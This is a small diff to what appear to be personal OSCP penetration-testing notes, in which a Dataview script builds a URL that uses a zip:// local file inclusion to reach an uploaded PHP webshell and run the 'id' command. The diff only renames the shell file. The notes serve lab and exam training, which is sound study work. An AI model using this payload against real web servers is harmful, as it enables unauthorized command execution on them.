@@ -50,7 +50,7 @@ browse to the uploaded php webshell using Zip Wrapper LFI
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `http://${discoveredDomain}/index.php?file=zip://uploads/upload_1714872711.zip%23simple_cmd&cmd=id`;
+const command = `http://${discoveredDomain}/index.php?file=zip://uploads/upload_1714872711.zip%23shell&cmd=id`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
